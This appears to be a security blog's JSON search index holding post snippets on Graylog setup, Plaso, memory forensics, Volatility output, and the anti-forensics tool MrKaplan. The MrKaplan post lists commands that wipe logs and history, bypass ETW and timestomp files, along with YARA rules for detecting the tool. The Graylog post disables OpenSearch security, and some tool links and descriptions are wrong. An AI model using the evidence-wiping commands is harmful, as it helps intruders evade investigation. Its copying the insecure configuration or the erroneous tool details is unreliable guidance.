[ { "title": "Installing and Configuring Graylog", "url": "/posts/Installing_Graylog/", "categories": "General IT and Security, Engineering", "tags": "graylog", "date": "2022-12-24 00:00:00 +1100", "snippet": "OverviewGraylog provides answers to your team’s security, application, and IT infrastructure questions by enabling you to combine, enrich, correlate, query, and visualize all your log data in one place.Installing Graylog 5.0 on Ubuntu 20.04PrerequisitesGraylog 5.0 requires the following to maintain compatibility with its software dependencies: OpenJDK 17 (embedded in the 5.0 installation file) Elasticsearch 7.10.2 OR OpenSearch 2.x MongoDB (5.x or 6.x)Installing MongoDB 6.1 Import the public key used by APT and add the repository to the APT sources file. Once completed, MongoDB can be installed after updating the package database.wget -qO - https://www.mongodb.org/static/pgp/server-6.0.asc | sudo apt-key add -echo \"deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-6.0.listsudo apt-get updatesudo apt-get install -y mongodb-org Enable the MongoDB service to start at bootsudo systemctl daemon-reloadsudo systemctl enable mongod.servicesudo systemctl restart mongod.servicesudo systemctl status mongod.service # Check that the service is activeInstalling OpenSearch 2.4.1Graylog supports running on either Elasticsearch or OpenSearch. The preference is entirely up to you, however I choose to run OpenSearch as it is opensource and includes a few enhanced features over ElasticSearch 7.10.2. For a more detailed reference on the difference between the two, see the referenced blog post. Check the vm.max_map_count setting to ensure that it is set to at least 262144 and disable memory paging and swapping to improve performance.cat /proc/sys/vm/max_map_count # Checks the current max_map_countsudo nano /etc/sysctl.conf\tvm.max_map_count=262144 # Enter this line to sysctl.confsudo sysctl -p # Reload the new settingsudo swapoff -a Create a User and Group for the OpenSearch app and create directories to store the application data and log files.sudo adduser --system --disabled-password --disabled-login --home /var/empty --no-create-home --quiet --force-badname --group opensearchsudo mkdir -p /graylog/opensearch/datasudo mkdir /var/log/opensearch Download and extract the appropriate tar.gz archive, in this case it is the x64 version. Move the extracted data into the previously created directory.wget https://artifacts.opensearch.org/releases/bundle/opensearch/2.4.1/opensearch-2.4.1-linux-x64.tar.gztar -xvf opensearch-2.4.1-linux-x64.tar.gzsudo mv opensearch-2.4.1/* /graylog/opensearch/sudo rm -rf opensearch* # Clean up the downloaded tar archive Set appropriate permissions for the OpenSearch app for the previously created opensearch user and group. Create an empty log file under the same user account.sudo chown -R opensearch:opensearch /graylog/opensearch/sudo chown -R opensearch:opensearch /var/log/opensearchsudo chmod -R 2750 /graylog/opensearch/sudo chmod -R 2750 /var/log/opensearchsudo -u opensearch touch /var/log/opensearch/graylog.log Create a system servicesudo sucat &gt; /etc/systemd/system/opensearch.service &lt;&lt;EOF[Unit]Description=OpensearchDocumentation=https://opensearch.org/docs/latestRequires=network.target remote-fs.targetAfter=network.target remote-fs.targetConditionPathExists=/graylog/opensearchConditionPathExists=/graylog/opensearch/data[Service]Environment=OPENSEARCH_HOME=/graylog/opensearchEnvironment=OPENSEARCH_PATH_CONF=/graylog/opensearch/configReadWritePaths=/var/log/opensearchUser=opensearchGroup=opensearchWorkingDirectory=/graylog/opensearchExecStart=/graylog/opensearch/bin/opensearch# Specifies the maximum file descriptor number that can be opened by this processLimitNOFILE=65535# Specifies the maximum number of processesLimitNPROC=4096# Specifies the maximum size of virtual memoryLimitAS=infinity# Specifies the maximum file sizeLimitFSIZE=infinity# Disable timeout logic and wait until process is stoppedTimeoutStopSec=0# SIGTERM signal is used to stop the Java processKillSignal=SIGTERM# Send the signal only to the JVM rather than its control groupKillMode=process# Java process is never killedSendSIGKILL=no# When a JVM receives a SIGTERM signal it exits with code 143SuccessExitStatus=143# Allow a slow startup before the systemd notifier module kicks in to extend the timeoutTimeoutStartSec=180[Install]WantedBy=multi-user.targetEOFConfiguring OpenSearch for Graylog Open the pre-completed YAML file and update the following fields, remove pound characters as required. This configuration is modified from the recommendations set by Graylog as its a single-node deployment.sudo nano /graylog/opensearch/config/opensearch.yml# Insert the below configurationcluster.name: graylognode.name: ${HOSTNAME}path.data: /graylog/opensearch/datapath.logs: /var/log/opensearchnetwork.host: &lt;IP&gt;http.port: 9200# discovery.seed_hosts: # cluster.initial_master_nodes:discovery.type: single-node action.auto_create_index: falseplugins.security.disabled: true Specify initial and maximum JVM heap sizes to half of the host systems memory allocation. This can be increased post configuration of Graylog should you require more memory assigned. After setting the JVM heap sizes, specify the environment path for the setting.sudo nano /graylog/opensearch/config/jvm.options# These settings represent 8GB allocations-Xms8g-Xmx8gexport OPENSEARCH_JAVA_HOME=/graylog/opensearch/jdk Enable the system service to run upon system bootsudo systemctl daemon-reloadsudo systemctl enable opensearch.servicesudo systemctl start opensearch.servicesudo systemctl status opensearch.service # Check that the service is activeInstalling Graylog Download and install the Graylog package from the legitimate repository. Once completed, the server components can be installed via the APT package.wget https://packages.graylog2.org/repo/packages/graylog-5.0-repository_latest.debsudo dpkg -i graylog-5.0-repository_latest.debsudo apt-get update &amp;&amp; sudo apt-get install graylog-serverrm graylog* # clean up downloadConfiguring Graylog Graylog is configured using a YAML file within the /etc/graylog/server/ directory and requires configuration in order to start. Initially, a root password hash using SHA2 is required. Make note of the password and hash as both are required to be entered into the configuration file. Note that the password must be a minimum of 16 characters.echo -n \"Enter Password: \" &amp;&amp; head -1 &lt;/dev/stdin | tr -d '\\n' | sha256sum | cut -d\" \" -f1sudo nano /etc/graylog/server/server.conf# Configure the details as requiredpassword_secret = &lt;PASSWORD&gt; # Min 16 Characters (at least 64 Recommended)root_username = &lt;USERNAME&gt;root_password_sha2 = &lt;ROOT PASSWORD HASH&gt; # Different to password_secret - memorize plain-text equivilent)http_bind_address = &lt;IP&gt;:9000 # Set to host IP Enable the system service to run upon system bootsudo systemctl daemon-reloadsudo systemctl enable graylog-server.servicesudo systemctl start graylog-server.servicesudo systemctl status graylog-server.service # Check that the service is active Graylog can now be access via web browser by navigating to http://&lt;IP&gt;:9000Resources Ubuntu installation (graylog.org) Install MongoDB Community Edition on Ubuntu — MongoDB Manual Elasticsearch vs OpenSearch: How They Differ? - Webuters Install OpenSearch - OpenSearch documentation Sending in log data (graylog.org)" }, { "title": "Awesome GitHub Links", "url": "/posts/Awesome-Github/", "categories": "General IT and Security, Resources", "tags": "", "date": "2022-12-20 00:00:00 +1100", "snippet": "These repositories contain lists of various cybersecurity tools, resources, and libraries that are considered particularly useful or noteworthy by the community. They are a good starting point for finding and exploring new cybersecurity tools and resources. Repository URL Description   Awesome Security https://github.com/sbilly/awesome-security A curated list of awesome cybersecurity resources, including tools, frameworks, libraries, and more.   Awesome Hacking https://github.com/carpedm20/awesome-hacking A curated list of awesome hacking tools, resources, and libraries.   Awesome Malware Analysis https://github.com/rshipp/awesome-malware-analysis A curated list of awesome malware analysis tools, resources, and libraries.   Awesome Incident Response https://github.com/meirwah/awesome-incident-response A curated list of awesome incident response tools, resources, and libraries.   Awesome Threat Intelligence https://github.com/hslatman/awesome-threat-intelligence A curated list of awesome threat intelligence tools, resources, and libraries.   Awesome CTF https://github.com/apsdehal/awesome-ctf A curated list of awesome CTF resources, including tools, frameworks, libraries, and write-ups.   " }, { "title": "Incident Timelines", "url": "/posts/Incident_Timelines/", "categories": "DFIR Tools, Toolkits", "tags": "log2timeline, plaso", "date": "2022-12-20 00:00:00 +1100", "snippet": "OverviewTimelines are an important tool in incident response and digital forensics for understanding the sequence of events that have occurred on a computer system. They can be used to: Identify the root cause of an incident: By understanding the sequence of events that led up to an incident, it is possible to identify the root cause and take appropriate corrective action. Investigate attacks: Timelines can be used to identify suspicious activity and track the actions of an attacker or perpetrator. Understand the history of a computer’s usage: Timelines can provide a comprehensive record of all the events that have occurred on a computer system, which can be useful for understanding its history and how it has been used.To create a timeline, forensic analysts typically gather data from multiple sources, such as system logs, browser history, and file metadata. Tools can then be used to create a timeline from this data and visualize it for easier analysis.Here is a list of forensic analysis tools that can create a timeline: Plaso A tool for generating a supertimeline from multiple data sources, such as system logs, browser history, and file metadata. Autopsy: A digital forensics platform that includes a timeline feature for creating a timeline from data sources such as system logs and file metadata. EnCase: A digital forensics platform that includes a timeline feature for creating a timeline from data sources such as system logs and file metadata.Timelines can be a valuable resource in incident response and digital forensics, as they provide a clear and concise overview of the events that have occurred on a system and can help investigators understand the context and circumstances surrounding an incident.PlasoPlaso (Plaso Langar Að Safna Öllu) is a digital forensics tool that extracts, analyzes, and stores digital artifacts from a computer system. It works by scanning a disk or disk image and extracting data from various sources, such as system logs, browser history, and file metadata. The extracted data is then processed and stored in a SQLite database, which can be queried and analyzed to identify suspicious activity and understand the sequence of events that have occurred on the system.Plaso uses a plug-in based architecture, which means that it can be easily extended to support new data sources and analysis techniques. It comes with a number of built-in plugins that can extract data from common sources, such as Windows event logs, MacOS system logs, and Android device logs.Plaso is composed of a number of modular components, which work together to extract, analyze, and store digital artifacts from a computer system.Here is a brief overview of some of the main modules in Plaso: image_export: This module extracts data from a disk image and save it to a file or directory. log2timeline: This module is used to extract data from various sources and create a supertimeline, which is a single timeline that combines data from multiple sources. It is the main module of Plaso and is responsible for coordinating the extraction, processing, and storage of data. pinfo: This module is used to display information about a Plaso storage file or the events contained within it. psort: This module is used to sort and filter events in a Plaso storage file. psteal: This module extracts specific types of data from a Plaso storage file and saves it to a file or directory.Note that each tool can be invoked with the -h or --help command line flag to display basic usage and command line option information.Installing Plaso on Ubuntu 22.04 LTSTo install Plaso from the GIFT Personal Package Archive (PPA) add the GIFT PPA:sudo add-apt-repository ppa:gift/stableUpdate and install Plaso:sudo apt-get updatesudo apt-get install plaso-toolsAdditionally, the SANS SIFT workstation is an independent project that provides Plaso releases pre-built within a forensic focused Linux distribution.If you are using SIFT and you have a deployment problem please report that directory to the SIFT project.Generating a Supertimeline with log2timelinelog2timeline is a tool that can be used to generate a supertimeline, which is a single timeline that combines data from multiple sources, such as system logs, browser history, and file metadata. This can be useful for quickly identifying suspicious activity or understanding the sequence of events that led to a particular outcome. Install log2timeline using your preferred method (e.g. pip install log2timeline). Run log2timeline with the appropriate parameters to specify the data sources you want to include in the supertimeline. For example:Copy codelog2timeline.py --storage-file timeline.plaso image.raw log2timeline will process the data sources and generate a plaso file with the supertimeline data. The output Plaso file in SQLite database, psort can be used to filter, sort and run automatic analysis on the contents of Plaso storage files. In the example below, psort is used to parse the timeline.plaso file and output a dynamic .csv file. Psort is capable of a lot more, see the “Using Psort” link below.psort.py -o dynamic -w timeline.csv timeline.plasoResources Plaso Documentation Log2timeline/plaso - GitHub Using Psort" }, { "title": "Markdown Overview", "url": "/posts/Markdown_Overview/", "categories": "General IT and Security, Programming", "tags": "markdown", "date": "2022-12-19 00:00:00 +1100", "snippet": "OverviewIf you’re a web developer, you’ve probably heard of Markdown. It’s a popular markup language that’s used to format text on the web. Whether you’re writing a blog post, creating documentation, or publishing content online, Markdown is a powerful tool that can help you create clean, easy-to-read text. In this blog post, we’ll take a closer look at what Markdown is, how it works, and why it’s so useful for web developers.What is Markdown?Markdown is a lightweight markup language that’s used to format text on the web. It was created in 2004 by John Gruber, and it’s since become one of the most popular markup languages for web developers. Markdown is easy to use, easy to read, and easy to write, making it a great choice for developers who want to create clean, readable text without the hassle of HTML tags.How Does Markdown Work?Markdown uses simple, easy-to-remember syntax to format text. For example, you can use asterisks to create bold text, underscores to create italicized text, and pound signs to create headings. Markdown also supports links, images, and other types of formatting, making it a versatile tool for formatting text on the web.One of the key benefits of Markdown is that it’s easy to read and write. You don’t need to know HTML or any other programming language to use it. All you need is a basic understanding of the syntax, and you can start formatting your text right away.Why is Markdown So Popular?There are several reasons why Markdown has become so popular among web developers. One of the main reasons is that it’s easy to use. With a simple, intuitive syntax, Markdown is easy to learn, even for developers who are new to markup languages.Another reason why Markdown is so popular is that it’s lightweight. Unlike HTML, which can be verbose and complex, Markdown is simple and easy to read. This makes it ideal for creating documentation and other types of content that need to be easy to read and understand.Finally, Markdown is extremely flexible. It can be used to create all types of content, from blog posts and articles to technical documentation and online courses. No matter what type of content you’re creating, Markdown can help you create clean, easy-to-read text that’s easy for your readers to understand.References Markdown Syntax: A comprehensive guide to the syntax of the Markdown language, including examples and explanations of how to use each element. Markdown Cheat Sheet: A quick reference guide to the most commonly used Markdown syntax, including examples of how to format text, create lists, and add links and images. Markdown Basics: A beginner’s guide to Markdown, including an introduction to the syntax and basic formatting options. GitHub Flavored Markdown: The official documentation for GitHub’s version of Markdown, including information on additional features and syntax not found in the original Markdown specification. Markdown Editor: An online tool that allows you to write and format text using Markdown syntax, with a live preview of the formatted text. Markdown Guide: A comprehensive resource on Markdown, including tutorials, syntax reference, and tips for using Markdown in different contexts." }, { "title": "Memory Forensics Overview", "url": "/posts/Memory_Forensics_Overview/", "categories": "DFIR Tools, Memory Forensics", "tags": "memory", "date": "2022-12-19 00:00:00 +1100", "snippet": "OverviewMemory forensics is a branch of digital forensics that involves analyzing a computer’s memory dump (or RAM) to uncover evidence of cyber attacks, malicious activity, and other issues. It is a powerful tool that allows forensic analysts to extract valuable information from a system even after the event has occurred and the system has been powered off.There are a few key steps involved in memory forensics: Acquiring the memory dump: This involves creating a copy of the system’s RAM, which can be done using specialized tools or by manually creating a snapshot of the system’s state. Analyzing the memory dump: Once the memory dump has been acquired, forensic analysts can use a variety of tools and techniques to analyze it and extract valuable information. This may include searching for specific strings of data, analyzing system and process data, and examining network connections. Extracting and reporting findings: Based on their analysis, forensic analysts can extract and report on any relevant findings, such as details about malware infections, evidence of cyber attacks, or other malicious activity.Memory forensics can be a valuable tool for organizations to understand the root cause of a cyber attack or other issue and take steps to prevent similar incidents in the future. It can also be used in criminal investigations to gather evidence and build a case against cybercriminals.Acquiring a Memory DumpThere are several methods for acquiring a memory dump, depending on the specific needs and circumstances of the forensic investigation. Some of the most common methods include: Cold boot: In this method, the system is powered off and the memory is extracted by physically removing the memory modules and connecting them to a separate device for analysis. This method is relatively invasive and requires physical access to the system, but it can be effective in cases where the system has been shut down and the memory is still intact. Live acquisition: This method is the most common and involves creating a copy of the system’s memory while it is still running. Live acquisition requires specialized tools and can be more challenging than other methods, as the system must remain operational and stable during the process. Hibernation or sleep mode: If the system has been put into hibernation or sleep mode, the memory may still be accessible and can be extracted using specialized tools. This method is less invasive than a cold boot attack and may be suitable for cases where the system has been shut down but the memory is still intact. Virtual machine snapshots: If the system being analyzed is a virtual machine, it may be possible to create a snapshot of the virtual machine’s state, including the memory, for analysis. This method is non-invasive and allows the system to remain operational during the forensic investigation.There are several tools that can be used to acquire memory dumps, depending on the specific needs and circumstances of the forensic investigation. Some common tools include: Tool Name Download Source Description WinPMem https://winpmem.velocidex.com/ WinPMem is a free, open-source tool for capturing and analyzing physical memory on Windows systems. It can be used to acquire a forensic image of the system’s memory, which can be analyzed for evidence of malicious activity. RAMCapture https://www.hex-rays.com/products/ida/support/download_freeware.shtml Belkasoft Live RAM Capturer is a tiny free forensic tool that allows to reliably extract the entire contents of computer’s volatile memory—even if protected by an active anti-debugging or anti-dumping system. FTK Imager https://accessdata.com/product-download/ftk-imager-lite FTK Imager is a commercial tool developed by AccessData for capturing and analyzing forensic images of hard drives and other media. It is widely used in incident response and digital forensics for its powerful features and user-friendly interface. AVLM https://github.com/microsoft/avml AVLM (Acquisition and Validation of Live Memory) is a free, open-source tool for capturing and analyzing physical memory on live Linux systems. It is designed to be simple and easy to use, with a focus on speed and reliability. It is important to note that each tool has its own capabilities and limitations, and it is important to choose the appropriate tool for the specific needs of the forensic investigation.Once the memory dump has been acquired, it can be analyzed using a variety of tools and techniques to extract valuable information and evidence.Analyzing the memory dumphere are many tools and techniques that can be used to analyze a memory dump and extract valuable information. Some common methods include: String searching: This involves searching the memory dump for specific strings of data, such as file names, URLs, or IP addresses. This can be useful for identifying malware or other malicious activity, as well as for tracing the actions of a user or process. System and process analysis: Analyzing the data stored in the memory dump can provide insights into the state of the system at the time the dump was created. This may include information about running processes, loaded modules, and open connections. Network analysis: Examining the data in the memory dump can also reveal details about network connections and communication, such as IP addresses, port numbers, and protocol data. Malware analysis: Memory dumps can be used to identify and analyze malware infections, including the types of malware present and their behavior.There are many tools available to assist with the analysis of memory dumps, including open source and commercial options. Some popular tools include: Tool Name Tool Download URL Description Volatility https://www.volatilityfoundation.org/ Volatility is a free, open-source memory forensic analysis tool that is widely used in incident response and digital forensics. It allows users to extract and analyze data from memory dumps, including information about processes, network connections, and other system activity. Rekall https://github.com/google/rekall Rekall is another free, open-source memory forensic analysis tool that is popular in the incident response and digital forensics communities. It offers a range of features for analyzing memory dumps, including the ability to extract and analyze data structures and artifacts, as well as perform memory analysis on live systems. X-Ways Forensics https://www.x-ways.net/forensics/ X-Ways Forensics is a commercial memory forensic analysis tool that is used by forensic analysts and incident responders for its powerful and user-friendly interface. It offers a range of features for analyzing and reporting on forensic data, including the ability to extract and analyze data from physical and logical memory. EnCase Forensic https://www.guidancesoftware.com/encase-forensic EnCase Forensic is a commercial memory forensic analysis tool developed by Guidance Software. It is widely used in incident response and digital forensics for its powerful features and user-friendly interface. It allows users to extract and analyze data from physical and logical memory, as well as other forensic sources such as hard drives and mobile devices. Memoryze https://www.mandiant.com/resources/download/memoryze Memoryze is a free, open-source memory forensic analysis tool developed by Mandiant (now part of FireEye). It allows users to extract and analyze data from physical and logical memory, including information about processes, network connections, and other system activity. It is designed to be simple and easy to use, with a focus on speed and reliability. It is important to note that memory analysis can be a complex and time-consuming process, as it involves examining large amounts of data and using specialized tools and techniques. It is often necessary to have a strong understanding of computer systems and forensic analysis to effectively analyze a memory dump.Extracting and reporting findingsOnce the analysis of a memory dump is complete, it is important to extract and report on any relevant findings. This may include details about malware infections, evidence of cyber attacks, or other malicious activity.There are several steps involved in extracting and reporting findings: Documenting the analysis process: It is important to carefully document the analysis process, including the tools and techniques used, any assumptions made, and the steps taken to extract and report on findings. This documentation can be used to support the conclusions reached and provide a clear and transparent record of the analysis. Extracting relevant data: Based on the analysis, it is necessary to extract any relevant data or evidence that supports the findings. This may include specific strings of data, system and process information, or network communication data. Reporting on findings: The findings should be clearly and concisely presented in a report, along with any relevant data or evidence to support the conclusions reached. The report should also include any recommendations for addressing any issues or concerns identified through the analysis.It is important to ensure that the findings and report are accurate and reliable, as they may be used in a legal or regulatory context. It is also important to follow any relevant laws and guidelines for handling and reporting on sensitive data.References " }, { "title": "MrKaplan", "url": "/posts/MrKaplan/", "categories": "Ethical Hacking Tools, Defense Evasion", "tags": "mrkaplan, indicator removal (T1070), modify registry (T1112)", "date": "2022-11-28 00:00:00 +1100", "snippet": "OverviewMrKaplan is a tool aimed to help red teamers stay hidden and clear as much forensic traces as possible. It works by saving information such as the time it ran, under which user and “reverting” the computer to look like before MrKaplan ran.MrKaplan is able to remove the following forensic artifacts: PowerShell History iNetCache Windows History Office History CryptNetCache Prefetch Windows Event Logs Windows Registry (UserAssist, comdlg32, bam, AppCompatCache) Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique MrKaplan v1.1.1 Defense Evasion Indicator Removal Modify Registry MrKaplan Help Page.\\MrKaplan.ps1 help███╗░░░███╗██████╗░░░░██╗░░██╗░█████╗░██████╗░██╗░░░░░░█████╗░███╗░░██╗████╗░████║██╔══██╗░░░██║░██╔╝██╔══██╗██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔████╔██║██████╔╝░░░█████═╝░███████║██████╔╝██║░░░░░███████║██╔██╗██║██║╚██╔╝██║██╔══██╗░░░██╔═██╗░██╔══██║██╔═══╝░██║░░░░░██╔══██║██║╚████║██║░╚═╝░██║██║░░██║██╗██║░╚██╗██║░░██║██║░░░░░███████╗██║░░██║██║░╚███║╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝\t[*] Possible Usage:\t[*] Show help message:\t\t.\\MrKaplan.ps1 help\t[*] For config creation and start:\t\t.\\MrKaplan.ps1 begin\t\t.\\MrKaplan.ps1 begin -Users Reddington,Liz\t\t.\\MrKaplan.ps1 begin -Users Reddington\t\t.\\MrKaplan.ps1 begin -EtwBypassMethod overflow\t\t.\\MrKaplan.ps1 begin -RunAsUser\t\t.\\MrKaplan.ps1 begin -Exclusions BamKey, OfficeHistory\t[*] For cleanup:\t\t.\\MrKaplan.ps1 end\t[*] To save file's timestamps:\t\t.\\MrKaplan.ps1 timestomp -StompedFilePath C:\\path\\to\\fileDetecting MrKaplanA YARA file is available via the MrKaplan Github page./* A rule to detect MrKaplan. Author: Ido Veltzman (Idov31) Date: 15-04-2022*/rule MrKaplanStandalone { meta: description = \"A rule to detect MrKaplanStandalone.\" author = \"Idov31\" date = \"2022-04-15\" strings: $imports1 = /[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(.*) | Invoke-Expression/i nocase $imports2 = /[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(.*) | iex/i nocase $s1 = \"MrKaplan.ps1\" ascii nocase $s2 = \"Clear-Evidence\" ascii nocase $s3 = \"EventLogSettings\" ascii nocase $s4 = \"runAsUser\" ascii nocase $s5 = \"PSHistory\" ascii nocase $s6 = \"C:\\\\Users\\\\$($user)\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt\" ascii nocase $s7 = \"HKCU:\\Software\\MrKaplan\" ascii nocase $s8 = \"Invoke-StompFiles\" ascii nocase $s9 = \"Clear-Files\" ascii nocase $s10 = \"Clear-Registry\" ascii nocase $s11 = \"Invoke-RestoreEtw\" ascii nocase $s12 = \"Invoke-LogFileToStomp\" ascii nocase $s13 = \"Invoke-SuspendEtw\" ascii nocase conditions: any of $imports* and 3 of ($s*)}rule MrKaplan { meta: description = \"A rule to detect MrKaplan.\" author = \"Idov31\" date = \"2022-04-15\" strings: $imports1 = \"Import-Module .\\\\Modules\\\\Registry.psm1\" ascii nocase $imports2 = \"Import-Module .\\\\Modules\\\\Files.psm1\" ascii nocase $imports3 = \"Import-Module .\\\\Modules\\\\Eventlogs.psm1\" ascii nocase $imports4 = \"Import-Module .\\\\Modules\\\\Utils.psm1\" ascii nocase $imports5 = \"ipmo .\\\\Modules\\\\Registry.psm1\" ascii nocase $imports6 = \"ipmo .\\\\Modules\\\\Files.psm1\" ascii nocase $imports7 = \"ipmo .\\\\Modules\\\\Eventlogs.psm1\" ascii nocase $imports8 = \"ipmo .\\\\Modules\\\\Utils.psm1\" ascii nocase $s1 = \"MrKaplan.ps1\" ascii nocase $s2 = \"Clear-Evidence\" ascii nocase $s3 = \"EventLogSettings\" ascii nocase $s4 = \"runAsUser\" ascii nocase $s5 = \"PSHistory\" ascii nocase $s6 = \"C:\\\\Users\\\\$($user)\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt\" ascii nocase $s7 = \"HKCU:\\Software\\MrKaplan\" ascii nocase $s8 = \"Invoke-StompFiles\" ascii nocase $s9 = \"Clear-Files\" ascii nocase $s10 = \"Clear-Registry\" ascii nocase $s11 = \"Invoke-RestoreEtw\" ascii nocase $s12 = \"Invoke-LogFileToStomp\" ascii nocase $s13 = \"Invoke-SuspendEtw\" ascii nocase conditions: 4 of $imports* and 3 of ($s*)}References Home · Idov31/MrKaplan Wiki (github.com) MrKaplan - Tool Aimed To Help Red Teamers To Stay Hidden By Clearing Evidence Of Execution (kitploit.com)" }, { "title": "Volatility", "url": "/posts/Volatility/", "categories": "DFIR Tools, Memory Forensics", "tags": "volatility, memory", "date": "2022-11-10 00:00:00 +1100", "snippet": "OverviewVolatility is the world’s most widely used framework for extracting digital artifacts from volatile memory (RAM) samples. The extraction techniques are performed completely independent of the system being investigated but offer visibility into the runtime state of the system. The framework is intended to introduce people to the techniques and complexities associated with extracting digital artifacts from volatile memory samples and provide a platform for further work into this exciting area of research. 1 Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique Volatility3 V2.4.1     Volatility PluginsVolatility consists of a number of plugins that can be used to perform various tasks, such as identifying and extracting process data, network connections, and other information that may be relevant to a forensic investigation.A list of all plugins available in Volatility can be found at the Volatility3 Docs Page. Some examples of plugins included in Volatility include: pstree: Display the process tree for a given memory image. sockscan: Scan for and list open TCP and UDP sockets. dlllist: List the DLLs (dynamic link libraries) loaded by each process. connscan: Scan for and list active TCP connections. netscan: Scan for and list active network connections.These are just a few examples of the plugins available in Volatility. There are many other plugins available that can be used to extract and analyze different types of forensic data. Refer to the Volatility3 Docs Page. for a complete list of plugins and their descriptions.InstructionsThe below examples were based off of a Windows 10 Memory Image available for download via the NIST CFReDS Portal which was provided from Magnet Forensics.Memory Image Identification (windows.info)Show OS &amp; kernel details of the memory sample being analyzed.Python3 Vol.py -f &lt;memory-image-name.img&gt; windows.infoVariable ValueKernel Base 0xf80002a48000DTB 0x187000Symbols file:///etc/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/ECE191A20CFF4465AE46DF96C2263845-1.json.xzIs64Bit TrueIsPAE Falselayer_name 0 WindowsIntel32ememory_layer 1 FileLayerKdDebuggerDataBlock 0xf80002c2a120NTBuildLab 7601.24384.amd64fre.win7sp1_ldr_CSDVersion 1KdVersionBlock 0xf80002c2a0e8Major/Minor 15.7601MachineType 34404KeNumberProcessors 2SystemTime 2020-04-20 23:23:26NtSystemRoot C:\\WindowsNtProductType NtProductWinNtNtMajorVersion 6NtMinorVersion 1PE MajorOperatingSystemVersion 6PE MinorOperatingSystemVersion 1PE Machine 34404PE TimeDateStamp Thu Feb 21 03:36:29 2019Running Processes (pslist)Lists the processes present in a particular windows memory image. Specific PIDs can be processed via the --pid switch. Additionally, each process can be dumped to disk via the --dump switch.python3 vol.py -f memdump-001.mem windows.pslistPID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime File output4 0 System 0xfa8030e57b00 108 572 N/A False 2020-04-20 22:44:37.000000 N/A Disabled280 4 smss.exe 0xfa8032005aa0 2 30 N/A False 2020-04-20 22:44:37.000000 N/A Disabled364 352 csrss.exe 0xfa8032f05b00 9 532 0 False 2020-04-20 22:44:38.000000 N/A Disabled408 352 wininit.exe 0xfa803254d580 3 76 0 False 2020-04-20 22:44:38.000000 N/A Disabled440 416 csrss.exe 0xfa8032a29350 11 534 1 False 2020-04-20 22:44:38.000000 N/A Disabled472 408 services.exe 0xfa803317e8e0 7 241 0 False 2020-04-20 22:44:38.000000 N/A DisabledRunning Processes (pstree)Plugin for listing processes in a tree based on their parent process ID. Specific PIDs can be processed via the --pid switch. Additionally, each process can be dumped to disk via the --dump switch.python3 vol.py -f memdump-001.mem windows.pstreePID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime4 0 System 0xfa8030e57b00 108 572 N/A False 2020-04-20 22:44:37.000000 N/A* 280 4 smss.exe 0xfa8032005aa0 2 30 N/A False 2020-04-20 22:44:37.000000 N/A364 352 csrss.exe 0xfa8032f05b00 9 532 0 False 2020-04-20 22:44:38.000000 N/A408 352 wininit.exe 0xfa803254d580 3 76 0 False 2020-04-20 22:44:38.000000 N/A* 472 408 services.exe 0xfa803317e8e0 7 241 0 False 2020-04-20 22:44:38.000000 N/A** 2944 472 svchost.exe 0xfa803365b060 9 136 0 False 2020-04-20 22:46:40.000000 N/A** 772 472 svchost.exe 0xfa8033266060 10 336 0 False 2020-04-20 22:44:39.000000 N/A** 1160 472 svchost.exe 0xfa8033424860 21 668 0 False 2020-04-20 22:44:39.000000 N/A** 660 472 svchost.exe 0xfa8033227b00 11 378 0 False 2020-04-20 22:44:38.000000 N/A*** 3440 660 WmiPrvSE.exe 0xfa80333d6060 13 332 0 False 2020-04-20 23:17:13.000000 N/A*** 2108 660 WmiPrvSE.exe 0xfa803379eb00 12 221 0 False 2020-04-20 22:44:40.000000 N/A** 2324 472 msdtc.exe 0xfa803386db00 12 148 0 False 2020-04-20 22:44:40.000000 N/ARunning and Terminated Processes (psscan)Returns a list of all processes, running and terminated for further analysis.python3 vol.py -f memdump-001.mem windows.psscanPID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime File output4196 3384 chrome.exe 0x13d406b00 8 106 1 False 2020-04-20 23:17:15.000000 N/A Disabled2216 472 dllhost.exe 0x13d4145f0 13 195 0 False 2020-04-20 22:44:40.000000 N/A Disabled2324 472 msdtc.exe 0x13d46db00 12 148 0 False 2020-04-20 22:44:40.000000 N/A Disabled2848 2208 slack.exe 0x13d4cdb00 14 276 1 False 2020-04-20 23:17:00.000000 N/A Disabled2032 472 svchost.exe 0x13d62c060 6 105 0 False 2020-04-20 22:44:40.000000 N/A DisabledInstalled Services (svcscan)Returns a list of all installed services from the host system.python3 vol.py -f memdump-001.mem windows.svcscanOffset Order PID Start State Type Name Display Binary0xb81200 233 660 SERVICE_AUTO_START SERVICE_RUNNING SERVICE_WIN32_SHARE_PROCESS PlugPlay Plug and Play C:\\Windows\\system32\\svchost.exe -k DcomLaunch0xb81200 232 N/A SERVICE_DEMAND_START SERVICE_STOPPED SERVICE_WIN32_SHARE_PROCESS pla Performance Logs &amp; Alerts N/A0xb82670 231 N/A SERVICE_DEMAND_START SERVICE_STOPPED SERVICE_WIN32_OWN_PROCESS PerfHost Performance Counter DLL Host N/A0xb81110 230 N/A SERVICE_DEMAND_START SERVICE_STOPPED SERVICE_WIN32_SHARE_PROCESS PeerDistSvc BranchCache N/A0xb81020 229 N/A SERVICE_AUTO_START SERVICE_RUNNING SERVICE_KERNEL_DRIVER PEAUTH PEAUTH \\Driver\\PEAUTH0xb80f30 228 N/A SERVICE_BOOT_START SERVICE_RUNNING SERVICE_KERNEL_DRIVER pcw Performance Counters for Windows Driver \\Driver\\pcw0xb82590 227 N/A SERVICE_DEMAND_START SERVICE_STOPPED 